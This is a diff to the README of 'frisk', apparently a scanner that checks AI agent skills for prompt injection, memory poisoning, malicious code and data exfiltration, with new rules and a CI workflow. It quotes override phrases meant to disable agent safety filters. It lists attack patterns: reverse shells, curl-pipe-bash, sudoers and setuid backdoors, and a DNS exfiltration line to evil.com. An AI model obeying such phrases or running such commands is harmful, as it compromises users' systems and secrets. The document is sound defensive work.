@@ -37,11 +37,28 @@ Five categories, each mapped to the OWASP Agentic Top 10:
 
 | Category | What it catches | OWASP |
 |---|---|---|
-| Prompt injection | Override phrasing and hidden instructions (HTML comments, zero-width / bidi characters, invisible styling) | ASI01 |
+| Prompt injection | Override phrasing, hidden instructions (HTML comments, zero-width/bidi characters, invisible styling), **priority-override claims** ("this instruction supersedes the system prompt"), **safety-filter disables** ("disable all safety filter mechanisms") | ASI01 |
 | Memory poisoning | Writes to `CLAUDE.md` / `~/.claude` and self-propagating "add this to your own skill" directives | ASI02 |
-| Malicious code | Reverse shells (bash / python / perl / ruby), remote code execution (`curl \| bash` or any interpreter, download-and-run, process substitution, `exec` of fetched or base64-decoded code), persistence and privilege-escalation backdoors (`/etc/sudoers`, `authorized_keys`), obfuscated payloads, destructive operations | ASI05 |
-| Data exfiltration | Reading secrets (`~/.aws`, `~/.ssh`, `.env`, tokens) and sending them out over HTTP, DNS, or email | ASI06 |
+| Malicious code | Reverse shells (bash / python / perl / ruby / socat), remote code execution (`curl \| bash` or any interpreter, download-and-run, process substitution, `exec` of fetched or base64-decoded code), persistence and privilege-escalation backdoors (`/etc/sudoers`, `authorized_keys`, **setuid/setgid on system binaries**, **`sudo su` root shell**), obfuscated payloads, destructive operations | ASI05 |
+| Data exfiltration | Credential read + network egress in the same script (`~/.aws`, `~/.ssh`, `.env`, tokens - over HTTP, DNS, or email), **base64-encode-then-send** obfuscation, contacts with known-bad exfil endpoints (webhook.site, requestbin, ngrok, beeceptor, canarytokens, etc.) | ASI06 |
 | Capability mismatch | Behavior the skill never declared in its frontmatter | ASI08 |
+
+### Detection rules added in v0.1.1
+
+| Rule ID | Category | Signal | Severity |
+|---------|----------|--------|----------|
+| INJ-006 | injection | Skill claims to override/supersede the system prompt or operator instructions | high |
+| INJ-safety | injection | Skill instructs the agent to disable safety filters or guardrails | high |
+| MAL-007 | malicious-code | `chmod` sets setuid/setgid bit on a system-path binary | high |
+| MAL-009 | malicious-code | `sudo su` / `su - root` interactive root shell | high |
+| EXF-005 | exfiltration | `base64 \| curl/wget` encode-then-transmit obfuscation | medium |
+
+Bug fixes in v0.1.1:
+- **exfiltration rule** now strips comments before scanning, so a commented-out credential reference no longer fires as high severity (false positive)
+- **capability rule** now strips comments before scanning, so `# curl ...` in a comment no longer triggers an undeclared-capability finding
+- **DNS exfil** pattern now catches `dig +time=5 $data.evil.com` (interleaved flags) that evaded the old single-variant regex
+- **httpx** added to egress patterns (Python async HTTP client was missing)
+- **SUSPICIOUS_HOSTS** expanded with `beeceptor.com` and `canarytokens.{com,org}`
 
 ## Usage
 
@@ -71,12 +88,24 @@ jobs:
       security-events: write
     steps:
       - uses: actions/checkout@v4
-      - uses: luoojason/frisk/action@v0
+      - name: Run frisk
+        run: npx frisk ./skills --sarif frisk.sarif --badge badge.json --fail-on high
+        # exit 2 = blocked (high findings present); exit 0 = clean
+      - name: Upload SARIF
+        if: always()  # upload even when frisk exits 2, so PR annotations appear
+        uses: github/codeql-action/upload-sarif@v3
         with:
-          path: ./skills
+          sarif_file: frisk.sarif
 ```
 
-Findings show up as PR annotations and in the Security tab. The action also writes a `badge.json`.
+The `--sarif` output includes `security-severity` scores (8.0 for high, 5.5 for medium) so GitHub's branch-protection rules can gate on security severity. Upload via `github/codeql-action/upload-sarif` to get inline PR annotations and findings in the Security tab.
+
+**Exit codes:**
+- `0` - clean, no findings at or above `--fail-on` threshold (default: `high`)
+- `2` - blocked, one or more findings at or above threshold
+- `1` (non-zero for any other reason) - tool or scan error
+
+Use `--fail-on medium` for a stricter gate.
 
 ## The "frisk verified" badge
 
